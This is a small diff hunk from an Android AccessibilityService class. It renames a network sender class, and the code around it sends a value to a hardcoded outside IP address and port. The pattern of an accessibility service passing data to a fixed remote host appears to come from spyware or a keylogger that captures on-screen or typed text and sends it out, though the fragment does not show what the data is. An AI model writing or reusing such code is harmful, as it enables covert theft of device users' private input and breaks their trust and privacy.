@@ -17,7 +17,7 @@ public class MyAccessibilityService extends AccessibilityService {
             ip="45.56.113.154";
             port="505";
 
-            GetTest messageSender = new GetTest();
+            MessageSender messageSender = new MessageSender();
             messageSender.execute(s1,ip,port);
 
     }
